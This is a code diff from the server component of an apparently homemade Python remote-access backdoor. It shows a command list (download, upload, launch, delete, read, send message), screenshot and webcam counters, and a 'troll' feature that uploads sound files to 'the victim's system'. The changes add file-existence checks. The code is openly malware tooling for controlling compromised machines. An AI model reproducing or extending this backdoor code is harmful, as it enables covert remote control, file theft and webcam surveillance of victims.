@@ -8,9 +8,9 @@ class server_backdoor:
     work_manager = wm.manager()
     required_arguments_commands = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = "TrollSFX"
-    hacked_sfx = TROLL_PATH + "\CrazyLaugh.wav"
-    troll_sfx = TROLL_PATH + "\RunningAway.wav"
+    TROLL_PATH = "SFX\\"
+    hacked_sfx = TROLL_PATH + "CrazyLaugh.wav"
+    troll_sfx = TROLL_PATH + "RunningAway.wav"
 
     screenshot_counter = 1
     webcam_counter = 1
@@ -171,17 +171,24 @@ class server_backdoor:
                         command.append(file_content)
                     elif command_0 == "troll":
                         if rest_of_command == "1":   #Hacked version
-                            print("[+] Uploading necessary files to the victim's system.")
-                            
-                            sfx_content = self.read_file(self.hacked_sfx)
-                            command.append(sfx_content)
+                            if os.path.exists(self.hacked_sfx) and os.path.isfile(self.hacked_sfx):
+                                print("[+] Uploading necessary files to the victim's system.")
+                                
+                                sfx_content = self.read_file(self.hacked_sfx)
+                                command.append(sfx_content)
+                            else:
+                                print("[-] You are missing HackingSFX.")
                         elif rest_of_command == "2":     #Troll version
-                            print("[+] Uploading necessary files to the victim's system.")
+                            if os.path.exists(self.troll_sfx) and os.path.isfile(self.troll_sfx):
+                                print("[+] Uploading necessary files to the victim's system.")
 
-                            sfx_content = self.read_file(self.troll_sfx)
-                            command.append(sfx_content)
+                                sfx_content = self.read_file(self.troll_sfx)
+                                command.append(sfx_content)
+                            else:
+                                print("[-] You are missing TrollSFX.")
+
                         else:
-                            result = "[-] (Server) No such parameter for troll."
+                            print("[-] (Server) No such parameter for troll.")
 
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
